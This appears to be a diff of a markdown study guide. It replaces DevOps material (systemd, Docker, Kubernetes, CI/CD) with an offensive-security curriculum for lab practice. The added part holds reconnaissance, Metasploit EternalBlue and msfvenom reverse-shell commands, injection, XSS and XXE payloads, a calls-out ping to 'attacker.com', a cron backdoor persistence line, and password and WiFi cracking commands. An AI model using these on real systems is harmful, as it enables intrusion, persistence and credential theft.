+**DNS Enumeration Techniques**
 
-**Service Types:**
-| Type | Description | Use Case |
-|------|-------------|----------|
-| `simple` | Default, exec continues running | Long-running daemons |
-| `forking` | Process forks and parent exits | Traditional daemons |
-| `oneshot` | Process runs and exits | Scripts, setup tasks |
-| `notify` | Service notifies systemd when ready | Modern applications |
-| `idle` | Waits for other jobs to finish | Low priority services |
+| Command | Purpose |
+|---|---|
+| `dig example.com` | Basic DNS lookup |
+| `dig example.com MX` | Mail exchange records |
+| `dig example.com NS` | Name server records |
+| `dig example.com TXT` | Text records (often reveal services) |
+| `dig @ns1.example.com example.com AXFR` | Zone transfer attempt |
+| `dnsrecon -d example.com` | Comprehensive DNS enumeration |
+| `fierce -dns example.com` | DNS scanner and subdomain brute-forcer |
 
-**Service Management Examples:**
-```bash
-# Create custom service
-sudo tee /etc/systemd/system/myapp.service > /dev/null << EOF
-[Unit]
-Description=My Custom Application
-After=network.target
+**Exercises: Reconnaissance**
 
-[Service]
-Type=simple
-User=www-data
-ExecStart=/usr/local/bin/myapp
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-# Reload systemd and enable service
-sudo systemctl daemon-reload
-sudo systemctl enable myapp.service
-sudo systemctl start myapp.service
-
-# Monitor service logs
-journalctl -u myapp.service -f       # Follow logs
-journalctl -u myapp.service --since "1 hour ago"  # Recent logs
-```
-
-### Runlevels & Targets
-
-**Systemd Targets (Runlevels):**
-| Target | Runlevel | Description |
-|--------|----------|-------------|
-| `poweroff.target` | 0 | System shutdown |
-| `rescue.target` | 1 | Single-user mode |
-| `multi-user.target` | 3 | Multi-user, no GUI |
-| `graphical.target` | 5 | Multi-user with GUI |
-| `reboot.target` | 6 | System restart |
-
-**Target Management:**
-```bash
-# View current target
-systemctl get-default            # Show default target
-systemctl list-units --type=target  # List active targets
-
-# Change targets
-sudo systemctl set-default multi-user.target   # Set default target
-sudo systemctl isolate rescue.target           # Switch to rescue mode
-sudo systemctl isolate graphical.target        # Switch to GUI mode
-
-# Target dependencies
-systemctl list-dependencies graphical.target   # Show target dependencies
-systemctl show multi-user.target              # Detailed target information
-```
-
-**Creating Custom Targets:**
-```ini
-# /etc/systemd/system/myproject.target
-[Unit]
-Description=My Project Services
-Requires=multi-user.target
-After=multi-user.target
-AllowIsolate=yes
-
-[Install]
-WantedBy=multi-user.target
-```
+1. Use `whois` to find registration information for `github.com`
+2. Enumerate all DNS record types for `google.com`
+3. Use `theHarvester` to find email addresses associated with a domain
+4. Search Shodan for Apache servers in your city
 
 ---
 
-## DevOps Essentials
+### Scanning & Enumeration
 
-### Containerization (Docker)
+Once you have initial information, the next step is to actively probe the target systems.
 
-**Docker Basics:**
-| Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `docker run` | Run container | `docker run -d nginx` | `-d` for detached mode |
-| `docker ps` | List containers | `docker ps -a` | `-a` shows all containers |
-| `docker images` | List images | `docker images` | Show local images |
-| `docker pull` | Download image | `docker pull ubuntu:20.04` | Pull specific tag |
-| `docker build` | Build image | `docker build -t myapp .` | Build from Dockerfile |
-| `docker exec` | Execute in container | `docker exec -it container bash` | Interactive shell |
-| `docker logs` | View logs | `docker logs container` | Show container output |
-| `docker stop` | Stop container | `docker stop container` | Graceful shutdown |
-| `docker rm` | Remove container | `docker rm container` | Delete container |
-| `docker rmi` | Remove image | `docker rmi image` | Delete image |
+#### Network Scanning
 
-**Dockerfile Example:**
-```dockerfile
-# Multi-stage build example
-FROM node:16-alpine AS builder
-WORKDIR /app
-COPY package*.json ./
-RUN npm ci --only=production
+**Nmap: The King of Scanners**
 
-FROM node:16-alpine AS runtime
-RUN addgroup -g 1001 -S nodejs && \
-    adduser -S nextjs -u 1001
-WORKDIR /app
-COPY --from=builder --chown=nextjs:nodejs /app/node_modules ./node_modules
-COPY --chown=nextjs:nodejs . .
-USER nextjs
-EXPOSE 3000
-CMD ["npm", "start"]
-```
+| Scan Type | Command | Purpose | Stealth Level |
+|---|---|---|---|
+| TCP SYN Scan | `nmap -sS target` | Fast, stealthy port scan | High |
+| TCP Connect | `nmap -sT target` | Full connection scan | Low |
+| UDP Scan | `nmap -sU target` | UDP port discovery | Medium |
+| Version Detection | `nmap -sV target` | Service version identification | Low |
+| OS Detection | `nmap -O target` | Operating system fingerprinting | Low |
+| Aggressive Scan | `nmap -A target` | All detection methods | Very Low |
+| Script Scan | `nmap --script vuln target` | Vulnerability scripts | Low |
 
-**Docker Compose:**
-```yaml
-# docker-compose.yml
-version: '3.8'
+**Advanced Nmap Techniques**
 
-services:
-  web:
-    build: .
-    ports:
-      - "3000:3000"
-    environment:
-      - NODE_ENV=production
-    depends_on:
-      - db
-      - redis
-    volumes:
-      - ./logs:/app/logs
-    restart: unless-stopped
+| Command | Purpose |
+|---|---|
+| `nmap -sS -O -sV --script vuln target` | Comprehensive security scan |
+| `nmap -p- target` | Scan all 65,535 ports |
+| `nmap --top-ports 1000 target` | Scan most common 1000 ports |
+| `nmap -sn 192.168.1.0/24` | Host discovery (ping sweep) |
+| `nmap --script http-enum target` | HTTP directory enumeration |
+| `nmap --script smb-enum-shares target` | SMB share enumeration |
 
-  db:
-    image: postgres:13
-    environment:
-      POSTGRES_DB: myapp
-      POSTGRES_USER: user
-      POSTGRES_PASSWORD: password
-    volumes:
-      - postgres_data:/var/lib/postgresql/data
-    ports:
-      - "5432:5432"
+#### Service Enumeration
 
-  redis:
-    image: redis:6-alpine
-    ports:
-      - "6379:6379"
-    volumes:
-      - redis_data:/data
+Once ports are identified, enumerate the services running on them:
 
-volumes:
-  postgres_data:
-  redis_data:
-```
+| Service | Enumeration Tools | Key Commands |
+|---|---|---|
+| **HTTP/HTTPS** | `nikto`, `dirb`, `gobuster` | `nikto -h http://target` |
+| **SMB** | `enum4linux`, `smbclient` | `enum4linux target` |
+| **SSH** | `ssh-audit`, manual testing | `ssh-audit target` |
+| **FTP** | `ftp`, `nmap scripts` | `nmap --script ftp-anon target` |
+| **SMTP** | `smtp-user-enum` | `smtp-user-enum -M VRFY -U users.txt -t target` |
+| **SNMP** | `snmpwalk`, `onesixtyone` | `snmpwalk -v2c -c public target` |
 
-**Container Management:**
-```bash
-# Docker container operations
-docker run -d --name myapp -p 8080:80 -v /host/path:/container/path nginx
-docker exec -it myapp /bin/bash
-docker cp file.txt myapp:/tmp/
-docker stats myapp                     # Resource usage
+**Web Application Enumeration**
 
-# Docker networking
-docker network create mynetwork        # Create network
-docker run --network mynetwork myapp   # Connect to network
-docker network ls                      # List networks
+| Tool | Purpose | Example Command |
+|---|---|---|
+| `dirb` | Directory brute-forcing | `dirb http://target /usr/share/dirb/wordlists/common.txt` |
+| `gobuster` | Fast directory/file brute-forcer | `gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt` |
+| `nikto` | Web vulnerability scanner | `nikto -h http://target` |
+| `whatweb` | Web technology identifier | `whatweb http://target` |
 
-# Docker volumes
-docker volume create myvolume          # Create volume
-docker run -v myvolume:/data myapp     # Use volume
-docker volume ls                       # List volumes
+**Exercises: Scanning & Enumeration**
 
-# Docker system management
-docker system prune                    # Clean up unused resources
-docker system df                       # Show disk usage
-```
-
-### Orchestration (Kubernetes)
-
-**Kubernetes Core Concepts:**
-- **Pod**: Smallest deployable unit
-- **Service**: Network access to pods
-- **Deployment**: Manages pod replicas
-- **Namespace**: Virtual clusters
-- **ConfigMap**: Configuration data
-- **Secret**: Sensitive data
-
-**Basic Kubernetes Commands:**
-```bash
-# Cluster information
-kubectl cluster-info                   # Cluster details
-kubectl get nodes                      # List cluster nodes
-kubectl describe node node-name       # Node details
-
-# Pod management
-kubectl get pods                       # List pods
-kubectl get pods -n namespace          # Pods in specific namespace
-kubectl describe pod pod-name          # Pod details
-kubectl logs pod-name                  # Pod logs
-kubectl exec -it pod-name -- bash     # Execute in pod
-
-# Deployment management
-kubectl create deployment nginx --image=nginx:1.20
-kubectl get deployments
-kubectl scale deployment nginx --replicas=3
-kubectl rollout status deployment nginx
-kubectl rollout undo deployment nginx
-
-# Service management
-kubectl expose deployment nginx --port=80 --type=LoadBalancer
-kubectl get services
-kubectl describe service nginx
-```
-
-**Kubernetes YAML Examples:**
-```yaml
-# deployment.yaml
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: nginx-deployment
-  labels:
-    app: nginx
-spec:
-  replicas: 3
-  selector:
-    matchLabels:
-      app: nginx
-  template:
-    metadata:
-      labels:
-        app: nginx
-    spec:
-      containers:
-      - name: nginx
-        image: nginx:1.20
-        ports:
-        - containerPort: 80
-        resources:
-          requests:
-            memory: "64Mi"
-            cpu: "250m"
-          limits:
-            memory: "128Mi"
-            cpu: "500m"
-
----
-# service.yaml
-apiVersion: v1
-kind: Service
-metadata:
-  name: nginx-service
-spec:
-  selector:
-    app: nginx
-  ports:
-    - protocol: TCP
-      port: 80
-      targetPort: 80
-  type: LoadBalancer
-```
-
-### CI/CD Pipelines
-
-**GitHub Actions Example:**
-```yaml
-# .github/workflows/deploy.yml
-name: Deploy Application
-
-on:
-  push:
-    branches: [ main ]
-  pull_request:
-    branches: [ main ]
-
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v3
-    - name: Setup Node.js
-      uses: actions/setup-node@v3
-      with:
-        node-version: '16'
-        cache: 'npm'
-    - run: npm ci
-    - run: npm test
-    - run: npm run build
-
-  deploy:
-    needs: test
-    runs-on: ubuntu-latest
-    if: github.ref == 'refs/heads/main'
-    steps:
-    - uses: actions/checkout@v3
-    - name: Deploy to server
-      run: |
-        echo "$DEPLOY_KEY" > deploy_key
-        chmod 600 deploy_key
-        ssh -i deploy_key user@server "cd /app && git pull && docker-compose up -d"
-      env:
-        DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
-```
-
-**GitLab CI Example:**
-```yaml
-# .gitlab-ci.yml
-stages:
-  - test
-  - build
-  - deploy
-
-variables:
-  DOCKER_IMAGE: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
-
-test:
-  stage: test
-  image: node:16
-  script:
-    - npm ci
-    - npm test
-  coverage: '/Coverage: \d+\.\d+%/'
-
-build:
-  stage: build
-  image: docker:latest
-  services:
-    - docker:dind
-  script:
-    - docker build -t $DOCKER_IMAGE .
-    - docker push $DOCKER_IMAGE
-  only:
-    - main
-
-deploy:
-  stage: deploy
-  image: alpine:latest
-  before_script:
-    - apk add --no-cache openssh-client
-    - eval $(ssh-agent -s)
-    - echo "$SSH_PRIVATE_KEY" | tr -d '\r' | ssh-add -
-  script:
-    - ssh user@server "docker pull $DOCKER_IMAGE && docker-compose up -d"
-  only:
-    - main
-  environment:
-    name: production
-    url: https://myapp.com
-```
-
-### Configuration Management
-
-**Ansible Basics:**
-```yaml
-# inventory.yml
-all:
-  children:
-    webservers:
-      hosts:
-        web1.example.com:
-        web2.example.com:
-    databases:
-      hosts:
-        db1.example.com:
-      vars:
-        mysql_port: 3306
-
-# playbook.yml
----
-- name: Configure web servers
-  hosts: webservers
-  become: yes
-  vars:
-    nginx_version: 1.20
-  tasks:
-    - name: Install nginx
-      package:
-        name: nginx
-        state: present
-    
-    - name: Start nginx service
-      service:
-        name: nginx
-        state: started
-        enabled: yes
-    
-    - name: Copy nginx configuration
-      template:
-        src: nginx.conf.j2
-        dest: /etc/nginx/nginx.conf
-      notify: restart nginx
-  
-  handlers:
-    - name: restart nginx
-      service:
-        name: nginx
-        state: restarted
-```
-
-**Terraform Example:**
-```hcl
-# main.tf
-terraform {
-  required_providers {
-    aws = {
-      source  = "hashicorp/aws"
-      version = "~> 4.0"
-    }
-  }
-}
-
-provider "aws" {
-  region = var.aws_region
-}
-
-resource "aws_instance" "web" {
-  count         = var.instance_count
-  ami           = var.ami_id
-  instance_type = var.instance_type
-  
-  vpc_security_group_ids = [aws_security_group.web.id]
-  
-  tags = {
-    Name = "web-server-${count.index + 1}"
-    Environment = var.environment
-  }
-}
-
-resource "aws_security_group" "web" {
-  name        = "web-sg"
-  description = "Security group for web servers"
-  
-  ingress {
-    from_port   = 80
-    to_port     = 80
-    protocol    = "tcp"
-    cidr_blocks = ["0.0.0.0/0"]
-  }
-  
-  ingress {
-    from_port   = 22
-    to_port     = 22
-    protocol    = "tcp"
-    cidr_blocks = [var.admin_cidr]
-  }
-  
-  egress {
-    from_port   = 0
-    to_port     = 0
-    protocol    = "-1"
-    cidr_blocks = ["0.0.0.0/0"]
-  }
-}
-
-# variables.tf
-variable "aws_region" {
-  description = "AWS region"
-  type        = string
-  default     = "us-west-2"
-}
-
-variable "instance_count" {
-  description = "Number of instances"
-  type        = number
-  default     = 2
-}
-```
+1. Perform a comprehensive nmap scan on `scanme.nmap.org`
+2. Use `gobuster` to find hidden directories on a test web application
+3. Enumerate SMB shares on a Windows machine (if available in your lab)
+4. Use `nikto` to scan a web application for vulnerabilities
 
 ---
 
-## Cybersecurity & Ethical Hacking
+### Exploitation Techniques
 
-### Security Fundamentals
+After identifying vulnerabilities, the next step is exploitation to gain unauthorized access.
 
-**Security Principles:**
-1. **CIA Triad**:
-   - **Confidentiality**: Information access control
-   - **Integrity**: Data accuracy and completeness
-   - **Availability**: System and data accessibility
+#### Metasploit Framework
 
-2. **Defense in Depth**: Multiple security layers
-3. **Principle of Least Privilege**: Minimal access rights
-4. **Zero Trust**: Never trust, always verify
+The most popular exploitation framework for penetration testing.
 
-**Common Vulnerabilities:**
-- **OWASP Top 10**: Web application vulnerabilities
-- **CVE Database**: Common vulnerabilities and exposures
-- **Buffer Overflows**: Memory corruption attacks
-- **SQL Injection**: Database query manipulation
-- **Cross-Site Scripting (XSS)**: Client-side code injection
-- **Cross-Site Request Forgery (CSRF)**: Unauthorized actions
+**Basic Metasploit Commands**
 
-### Reconnaissance Tools
+| Command | Purpose |
+|---|---|
+| `msfconsole` | Start Metasploit console |
+| `search ms17-010` | Search for exploits |
+| `use exploit/windows/smb/ms17_010_eternalblue` | Select an exploit |
+| `show options` | Display exploit options |
+| `set RHOSTS 192.168.1.100` | Set target host |
+| `set payload windows/x64/meterpreter/reverse_tcp` | Set payload |
+| `set LHOST 192.168.1.50` | Set listening host |
+| `exploit` | Run the exploit |
 
-**Network Discovery:**
-| Tool | Purpose | Example | Notes |
-|------|---------|---------|-------|
-| `nmap` | Network/port scanning | `nmap -sS -O target.com` | Most versatile scanner |
-| `masscan` | High-speed port scanner | `masscan -p1-65535 192.168.1.0/24` | Extremely fast |
-| `zmap` | Internet-wide scanning | `zmap -p 80 -o results.txt` | Single port, many hosts |
-| `netdiscover` | Network discovery | `netdiscover -r 192.168.1.0/24` | ARP-based discovery |
+**Common Metasploit Modules**
 
-**Information Gathering:**
+| Vulnerability | Module | Target |
+|---|---|---|
+| EternalBlue | `exploit/windows/smb/ms17_010_eternalblue` | Windows SMB |
+| Shellshock | `exploit/multi/http/apache_mod_cgi_bash_env_exec` | Apache CGI |
+| Struts2 | `exploit/multi/http/struts2_content_type_ognl` | Java Struts |
+| BlueKeep | `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` | Windows RDP |
+
+#### Manual Exploitation Techniques
+
+**Buffer Overflow Basics**
+
+Buffer overflows are a classic vulnerability where input exceeds allocated memory.
+
 ```bash
-# Nmap comprehensive scanning
-nmap -sS -sV -sC -O -A target.com    # Aggressive scan
-nmap --script vuln target.com        # Vulnerability scripts
-nmap --script=http-enum target.com   # HTTP enumeration
-nmap --script=dns-brute target.com   # DNS brute forcing
+# Generate cyclic pattern for offset finding
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
 
-# DNS reconnaissance
-dig target.com ANY                   # All DNS records
-dig @8.8.8.8 target.com axfr        # Zone transfer attempt
-fierce -dns target.com               # DNS subdomain scanner
-dnsrecon -d target.com -t std        # DNS enumeration
+# Find offset after crash
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41414141
 
-# Web application reconnaissance
-whatweb target.com                   # Web technology identification
-nikto -h target.com                  # Web vulnerability scanner
-dirb http://target.com wordlist.txt  # Directory brute forcing
-gobuster dir -u http://target.com -w /usr/share/wordlists/common.txt
-
-# OSINT (Open Source Intelligence)
-whois target.com                     # Domain information
-theHarvester -d target.com -b google # Email harvesting
-shodan search "apache 2.4.1"        # Shodan search engine
+# Generate shellcode
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python
 ```
 
-### Vulnerability Assessment
+**SQL Injection**
 
-**Vulnerability Scanners:**
-| Tool | Type | Purpose | Notes |
-|------|------|---------|-------|
-| `nessus` | Commercial | Comprehensive vulnerability scanning | Industry standard |
-| `openvas` | Open source | Network vulnerability scanner | Free alternative |
-| `nuclei` | Open source | Fast vulnerability scanner | Template-based |
-| `nikto` | Open source | Web server scanner | HTTP-focused |
+| Injection Type | Example Payload | Purpose |
+|---|---|---|
+| Union-based | `' UNION SELECT 1,2,database()--` | Extract data |
+| Boolean-based | `' AND 1=1--` | True/false responses |
+| Time-based | `'; WAITFOR DELAY '00:00:05'--` | Blind injection |
+| Error-based | `' AND (SELECT COUNT(*) FROM information_schema.tables)--` | Error messages |
 
-**Web Application Testing:**
-```bash
-# OWASP ZAP (Web Application Security Scanner)
-zaproxy                              # GUI interface
-zap-baseline.py -t http://target.com # Baseline scan
-zap-full-scan.py -t http://target.com # Full scan
+**Command Injection**
 
-# Burp Suite (Professional web app testing)
-# GUI-based tool for intercepting and manipulating web traffic
+| Context | Payload Example | Notes |
+|---|---|---|
+| Linux | `; cat /etc/passwd` | Command separator |
+| Windows | `& type C:\Windows\System32\drivers\etc\hosts` | Command separator |
+| Blind | `; ping -c 1 attacker.com` | Out-of-band verification |
 
-# SQLmap (SQL injection testing)
-sqlmap -u "http://target.com/page.php?id=1" --dbs    # Database enumeration
-sqlmap -u "http://target.com/page.php?id=1" --dump   # Data extraction
+**Exercises: Exploitation**
 
-# XSS testing
-# Manual testing with payloads:
-<script>alert('XSS')</script>
-<img src=x onerror=alert('XSS')>
-```
-
-### Penetration Testing
-
-**Exploitation Frameworks:**
-```bash
-# Metasploit Framework
-msfconsole                           # Start Metasploit console
-search ms17-010                      # Search for exploits
-use exploit/windows/smb/ms17_010_eternalblue  # Select exploit
-set RHOSTS target_ip                 # Set target
-set PAYLOAD windows/x64/meterpreter/reverse_tcp  # Set payload
-exploit                              # Run exploit
-
-# Post-exploitation with Meterpreter
-sysinfo                              # System information
-getuid                               # Current user
-ps                                   # Running processes
-migrate 1234                         # Migrate to process
-hashdump                             # Extract password hashes
-```
-
-**Network Exploitation:**
-```bash
-# Exploit tools
-searchsploit apache 2.4.1           # Search exploit database
-exploit-db                           # Local exploit database
-
-# Buffer overflow testing
-python -c "print 'A' * 1000"        # Generate overflow string
-gdb program                          # Debug program
-pattern_create.rb -l 1000            # Create unique pattern
-pattern_offset.rb -q 0x41414141      # Find offset
-
-# Network sniffing
-tcpdump -i eth0 -w capture.pcap      # Capture packets
-wireshark                            # GUI packet analyzer
-ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//  # ARP poisoning
-```
-
-### Digital Forensics
-
-**Evidence Collection:**
-```bash
-# Disk imaging
-dd if=/dev/sda of=/evidence/disk.img bs=1M status=progress  # Raw copy
-dc3dd if=/dev/sda of=/evidence/disk.img hash=md5            # Forensic copy
-ewfacquire /dev/sda                  # Expert Witness Format
-
-# Memory acquisition
-LiME (Linux Memory Extractor)        # Acquire RAM
-volatility -f memory.dump imageinfo  # Analyze memory dump
-
-# File system analysis
-autopsy                              # GUI forensic tool
-sleuthkit tools:
-  fls -r disk.img                    # List files
-  icat disk.img 1234 > recovered.txt # Extract file by inode
-  mmls disk.img                      # Show partitions
-```
-
-**Log Analysis:**
-```bash
-# System log analysis
-last                                 # Login history
-lastb                                # Failed login attempts
-journalctl --since "2024-01-01"     # Systemd logs
-grep "Failed password" /var/log/auth.log  # Failed SSH attempts
-
-# Web log analysis
-awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -nr
-grep "404" /var/log/nginx/access.log
-goaccess /var/log/apache2/access.log --log-format=COMBINED -o report.html
-```
+1. Set up Metasploitable 2 and exploit it using Metasploit
+2. Practice SQL injection on DVWA (Damn Vulnerable Web Application)
+3. Create a simple buffer overflow exploit using a vulnerable program
+4. Test command injection vulnerabilities in a lab environment
 
 ---
 
-## System Hardening
+### Post-Exploitation
+
+After gaining initial access, attackers focus on maintaining access and expanding their foothold.
+
+#### Privilege Escalation
+
+**Linux Privilege Escalation**
+
+| Technique | Commands | Description |
+|---|---|---|
+| SUID/SGID binaries | `find / -perm -4000 2>/dev/null` | Find SUID programs |
+| Writable files | `find / -writable -type f 2>/dev/null` | Find writable files |
+| Cron jobs | `cat /etc/crontab`, `ls -la /etc/cron*` | Scheduled tasks |
+| Kernel exploits | `uname -a`, `searchsploit kernel` | OS vulnerabilities |
+| Sudo misconfigurations | `sudo -l` | Sudo permissions |
+
+**Windows Privilege Escalation**
+
+| Technique | Commands | Description |
+|---|---|---|
+| Unquoted service paths | `wmic service get name,pathname,displayname,startmode` | Service vulnerabilities |
+| Registry autoruns | `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Startup programs |
+| Scheduled tasks | `schtasks /query /fo LIST /v` | Windows task scheduler |
+| Token impersonation | Meterpreter: `use incognito` | Token manipulation |
+
+#### Persistence Mechanisms
+
+**Linux Persistence**
+
+| Method | Implementation | Detection Difficulty |
+|---|---|---|
+| SSH keys | Add to `~/.ssh/authorized_keys` | Medium |
+| Cron jobs | `(crontab -l ; echo "* * * * * /tmp/backdoor") | crontab -` | Low |
+| Service creation | Create systemd service | Medium |
+| .bashrc modification | Add commands to shell startup | Low |
+
+**Windows Persistence**
+
+| Method | Implementation | Detection Difficulty |
+|---|---|---|
+| Registry run keys | Add to startup registry | Low |
+| Scheduled tasks | `schtasks` command | Medium |
+| Service creation | `sc create` command | Medium |
+| DLL hijacking | Replace legitimate DLLs | High |
+
+#### Lateral Movement
+
+**Techniques for Network Traversal**
+
+| Technique | Tools | Purpose |
+|---|---|---|
+| Pass-the-Hash | `pth-winexe`, `crackmapexec` | Use NTLM hashes |
+| Pass-the-Ticket | `mimikatz`, `rubeus` | Kerberos ticket reuse |
+| PSExec | `psexec.py`, `winexe` | Remote command execution |
+| WMI | `wmiexec.py` | Windows Management |
+| SSH tunneling | `ssh -L`, `ssh -D` | Network pivoting |
+
+**Exercises: Post-Exploitation**
+
+1. Practice Linux privilege escalation on VulnHub VMs
+2. Set up persistence mechanisms in a test environment
+3. Use Metasploit's post-exploitation modules
+4. Practice lateral movement in a multi-machine lab
+
+---
+
+### Web Application Security
+
+Web applications are a primary attack vector in modern cybersecurity.
+
+#### OWASP Top 10 (2021)
+
+| Rank | Vulnerability | Description | Example Attack |
+|---|---|---|---|
+| A01 | Broken Access Control | Improper access restrictions | Vertical/horizontal privilege escalation |
+| A02 | Cryptographic Failures | Weak crypto implementation | Sensitive data exposure |
+| A03 | Injection | Untrusted data sent to interpreter | SQL, NoSQL, LDAP, OS command injection |
+| A04 | Insecure Design | Security design flaws | Missing security controls |
+| A05 | Security Misconfiguration | Insecure default configs | Unnecessary features enabled |
+| A06 | Vulnerable Components | Using vulnerable libraries | Known CVEs in dependencies |
+| A07 | Identification/Authentication | Weak authentication | Brute force, credential stuffing |
+| A08 | Software/Data Integrity | Insecure CI/CD, auto-updates | Supply chain attacks |
+| A09 | Security Logging/Monitoring | Inadequate logging | Delayed attack detection |
+| A10 | Server-Side Request Forgery | SSRF attacks | Internal network access |
+
+#### Web Application Testing Tools
+
+| Tool | Purpose | Key Features |
+|---|---|---|
+| **Burp Suite** | Web app security testing | Proxy, scanner, intruder, repeater |
+| **OWASP ZAP** | Open-source web app scanner | Automated scanning, manual testing |
+| **SQLmap** | SQL injection exploitation | Automatic SQL injection testing |
+| **XSSer** | Cross-Site Scripting testing | XSS vulnerability detection |
+| **Wfuzz** | Web application fuzzer | Directory/parameter brute-forcing |
+
+**Burp Suite Workflow**
+
+1. **Proxy Setup**: Configure browser to use Burp proxy
+2. **Target Mapping**: Spider/crawl the application
+3. **Vulnerability Scanning**: Run automated scans
+4. **Manual Testing**: Use Repeater for specific tests
+5. **Exploitation**: Use Intruder for attacks
+
+**Common Web Attacks**
+
+| Attack Type | Payload Example | Impact |
+|---|---|---|
+| **XSS (Reflected)** | `<script>alert('XSS')</script>` | Session hijacking |
+| **XSS (Stored)** | `<img src=x onerror=alert('XSS')>` | Persistent compromise |
+| **CSRF** | `<img src="http://bank.com/transfer?amount=1000&to=attacker">` | Unauthorized actions |
+| **XXE** | `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]>` | File disclosure |
+| **SSTI** | `{{7*7}}` (Template injection) | Remote code execution |
+
+**Exercises: Web Application Security**
+
+1. Complete DVWA (Damn Vulnerable Web Application) challenges
+2. Use Burp Suite to find vulnerabilities in a test application
+3. Practice SQL injection with SQLmap on a vulnerable target
+4. Set up and test OWASP WebGoat security training
+
+---
+
+### Password Attacks
+
+Password attacks are fundamental to many penetration tests.
+
+#### Password Attack Types
+
+| Attack Type | Description | Tools | Time Complexity |
+|---|---|---|---|
+| **Dictionary** | Uses common passwords | `hydra`, `medusa` | Fast |
+| **Brute Force** | Tries all combinations | `hashcat`, `john` | Very Slow |
+| **Hybrid** | Dictionary + rules | `hashcat`, `john` | Medium |
+| **Rainbow Tables** | Precomputed hashes | `ophcrack` | Very Fast |
+| **Social Engineering** | Human manipulation | N/A | Variable |
+
+#### Password Cracking Tools
+
+**John the Ripper**
+
+| Command | Purpose |
+|---|---|
+| `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` | Dictionary attack |
+| `john --incremental hashes.txt` | Brute force attack |
+| `john --show hashes.txt` | Show cracked passwords |
+| `john --rules --wordlist=passwords.txt hashes.txt` | Rule-based attack |
+
+**Hashcat**
+
+| Command | Purpose |
+|---|---|
+| `hashcat -m 1000 -a 0 hashes.txt rockyou.txt` | NTLM dictionary attack |
+| `hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l` | MD5 brute force (8 lowercase) |
+| `hashcat --show hashes.txt` | Show cracked passwords |
+| `hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule` | Rule-based attack |
+
+**Hydra (Online Attacks)**
+
+| Service | Command Example |
+|---|---|
+| SSH | `hydra -l admin -P passwords.txt ssh://192.168.1.100` |
+| HTTP POST | `hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"` |
+| FTP | `hydra -l ftp -P passwords.txt ftp://192.168.1.100` |
+| SMB | `hydra -l administrator -P passwords.txt smb://192.168.1.100` |
+
+#### Hash Types and Identification
+
+| Hash Type | Example | Hashcat Mode |
+|---|---|---|
+| MD5 | `5d41402abc4b2a76b9719d911017c592` | 0 |
+| SHA1 | `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d` | 100 |
+| NTLM | `b4b9b02e6f09a9bd760f388b67351e2b` | 1000 |
+| bcrypt | `$2b$12$GhvMmNVjRW29ulnudl.LbuAnUtN/LRfe1JsBm1Xu6LE3059z5Tr8m` | 3200 |
+
+**Exercises: Password Attacks**
+
+1. Create a hash file and crack it with John the Ripper
+2. Use Hydra to brute-force SSH login on a test server
+3. Practice with different hash types using Hashcat
+4. Compare attack speeds between dictionary and brute-force methods
+
+---
+
+### Wireless Security
+
+Wireless networks present unique attack vectors and security challenges.
+
+#### WiFi Security Protocols
+
+| Protocol | Security Level | Vulnerabilities |
+|---|---|---|
+| **WEP** | Very Low | RC4 stream cipher flaws, easily cracked |
+| **WPA** | Low | TKIP vulnerabilities, susceptible to attacks |
+| **WPA2** | Medium | WPS vulnerabilities, KRACK attack |
+| **WPA3** | High | Dragonfly handshake, improved security |
+
+#### Wireless Attack Tools
+
+**Aircrack-ng Suite**
+
+| Tool | Purpose | Example Command |
+|---|---|---|
+| `airmon-ng` | Monitor mode setup | `airmon-ng start wlan0` |
+| `airodump-ng` | Packet capture | `airodump-ng wlan0mon` |
+| `aireplay-ng` | Packet injection | `aireplay-ng -0 10 -a [BSSID] wlan0mon` |
+| `aircrack-ng` | Password cracking | `aircrack-ng -w wordlist.txt capture.cap` |
+
+**WiFi Attack Methodology**
+
+1. **Reconnaissance**: `airodump-ng wlan0mon`
+2. **Target Selection**: Choose WPA2 network
+3. **Handshake Capture**: `aireplay-ng -0 5 -a [BSSID] wlan0mon`
+4. **Password Cracking**: `aircrack-ng -w rockyou.txt handshake.cap`
+
+**Other Wireless Tools**
+
+| Tool | Purpose | Use Case |
+|---|---|---|
+| `reaver` | WPS PIN attack | WPS-enabled routers |
+| `bully` | WPS brute force | Alternative to reaver |
+| `wifite` | Automated WiFi attacks | Beginner-friendly |
+| `kismet` | Wireless detector | Comprehensive monitoring |
+
+**Exercises: Wireless Security**
+
+1. Set up a test WiFi network and capture handshakes
+2. Use aircrack-ng to crack WPA2 passwords
+3. Test WPS vulnerabilities with reaver
+4. Practice with wifite for automated attacks
+
+---
+
+## 🛡️ Defensive Security (Blue Team)
+
+While offensive security focuses on finding and exploiting vulnerabilities, defensive security is about protecting systems and detecting attacks. This is equally important and often more challenging than offensive work.
+
+### Defense-in-Depth Strategy
+
+Modern cybersecurity relies on multiple layers of protection:
+
+| Layer | Purpose | Technologies | Example Controls |
+|---|---|---|---|
+| **Physical** | Physical access control | Locks, cameras, guards | Badge readers, biometrics |
+| **Perimeter** | Network boundary protection | Firewalls, IPS/IDS | Border routers, DMZ |
+| **Network** | Internal network segmentation | VLANs, micro-segmentation | Network access control |
+| **Host** | Individual system protection | Antivirus, host-based firewalls | Endpoint protection |
+| **Application** | Software-level security | Input validation, authentication | Secure coding practices |
